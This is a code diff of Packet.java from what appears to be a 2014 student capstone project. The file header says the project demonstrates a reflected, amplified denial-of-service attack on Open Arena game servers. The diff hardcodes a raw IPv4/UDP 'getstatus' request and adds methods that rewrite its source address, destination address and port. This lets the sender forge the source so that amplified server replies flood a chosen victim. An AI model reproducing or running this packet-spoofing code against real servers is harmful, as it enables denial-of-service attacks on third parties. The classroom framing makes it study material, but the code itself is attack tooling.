@@ -1,3 +1,25 @@
+/** 
+ * Class: CMSC495 Spring 2014
+ * Assignment: Capstone, Week 6, Sprint 1
+ * 
+ * Team Members: Brad Norman, Jamie Lane, Daniel Ross
+ * 
+ * Date: 26 April 2014 
+ * 
+ * File:	RdosTester.java (main application) 	
+ * 			->Packet.java<-
+ * 			PacketTransmitter.java
+ * 			Analysis.java
+ * 			
+ * 			Demonstrate a reflected and amplified Denial-of-Service attack mechanism
+ * 			exploiting a vulnerability in Open Arena server versions <= 0.8.5
+ * 
+ * Current Status: Operational as described
+ * 
+ * @author Daniel Ross
+ *           
+ **/
+
 package teamC;
 
 // models an IP packet
@@ -12,22 +34,17 @@ public class Packet {
 	// destination port
 	String dstPort;
 	
-	// IP header
-	String ipHeader;
-	
-	// UDP payload of IP packet (includes UDP header)
-	String udpPayload;	
-	
+	// base getStatus request packet, includes IPv4 header, UDP header, UDP data
+	String packetBase = "450000293cbd400080110000c0a8580ac0a858186d386d380015319affffffff676574737461747573";	
+
 	// complete IP packet
 	String completePacket;
 	
 	// size of packet in bytes
-	int packetSize;
-	
-	// base getInfo request packet, IP
-	String packetBase = "ffffffffffff001fbc01b4db08004500002b60a100008011c166c0a85812ffffffff6d386d3b001762c3ffffffff676574696e666f20787878000000";
+	int packetSize;	
 	
 	// constructor requiring complete packet as String representing hex
+	// useful for received packets
 	public Packet(String completePacket)
 	{
 		this.completePacket = completePacket;
@@ -35,52 +52,54 @@ public class Packet {
 	
 	}	// end Packet constructor
 
-	// constructor requiring source and destination address and port info, creates packet suitable for transmission
-	public Packet(int srcIP1, int srcIP2, int srcIP3, int srcIP4, int dstIP1,
-			int dstIP2, int dstIP3, int dstIP4, int port)
+	// constructor requiring source and destination address and port info
+	// useful for creating packets to transmit, requires checksums to be updated before transmission
+	public Packet(int srcIP1, int srcIP2, int srcIP3, int srcIP4, int dstIP1, int dstIP2, int dstIP3, int dstIP4, int port)
 	{
-		this.srcIp = Integer.toHexString(srcIP1) + Integer.toHexString(srcIP2) + Integer.toHexString(srcIP3) + Integer.toHexString(srcIP4);
-		this.dstIp = Integer.toHexString(dstIP1) + Integer.toHexString(dstIP2) + Integer.toHexString(dstIP3) + Integer.toHexString(dstIP4);
-		this.dstPort = Integer.toHexString(port);
-		ipHeaderMaker(srcIp, dstIp);
-		udpPayloadMaker(dstPort);
-		combiner();
+		// convert source address to hex, add leading zeroes if necessary, concatenate
+		this.srcIp = formatOctet(srcIP1) + formatOctet(srcIP2) + formatOctet(srcIP3) + formatOctet(srcIP4);
+		
+		// convert destination address to hex, add leading zeroes if necessary, concatenate
+		this.dstIp = formatOctet(dstIP1) + formatOctet(dstIP2) + formatOctet(dstIP3) + formatOctet(dstIP4);
+		
+		// convert destination port to hex, add leading zeroes if necessary
+		this.dstPort = formatPort(port);
+		
+		// overwrite packetBase IP and UDP header fields with user specified info
+		packetRewrite();
+		
+		// calculate packet size in bytes
 		packetSizeCalc();
 		
 	}  // end Packet constructor
 	
+	// calculate packet size in bytes
 	private void packetSizeCalc() {
 		
 		packetSize = completePacket.length() / 2;
 		
-	}  // end method packetSizeCalc;
+	}  // end method packetSizeCalc	
 	
-	// create IP header	
-	private void ipHeaderMaker(String srcIp, String dstIp)
+	// converts integer representation of IP address octets into a hex string, with leading zeroes
+	private String formatOctet(int octet)
 	{
-		// call API to create header in IPv4 format
-		ipHeader = srcIp + dstIp;
+		return Integer.toHexString(0x100 | octet).substring(1);
 	
-	}  // end method ipHeaderMaker
+	}  // end method formatOctet
 	
-	// create UDP payload
-	private void udpPayloadMaker(String dstPort)
+	// converts integer representation of network port into a hex string, with leading zeroes
+	private String formatPort(int port)
 	{
-		String udpPayloadTemplate = dstPort;
-		// int portOffset = 4;
+		return Integer.toHexString(0x10000 | port).substring(1);
+	
+	} // end method formatPort
+	
+	// overwrite packetBase IP and UDP header fields with user specified info
+	private void packetRewrite()
+	{
+		completePacket = packetBase.substring(0,24) + srcIp + dstIp + packetBase.substring(40,44) + dstPort + packetBase.substring(48,packetBase.length());
 		
-		//overwrite contents of udpPayloadTemplate at portOffset with dstPort;
-		
-		udpPayload =  udpPayloadTemplate;
-	
-	}  // end method udppayloadMaker
-	
-	// combine IP header and UDP payload to make a complete packet
-	private void combiner()
-	{
-		completePacket = ipHeader + udpPayload;
-	
-	}  // end method combiner
+	} // end method packetRewrite
 	
 	// return packet size
 	public int getPacketSize() {
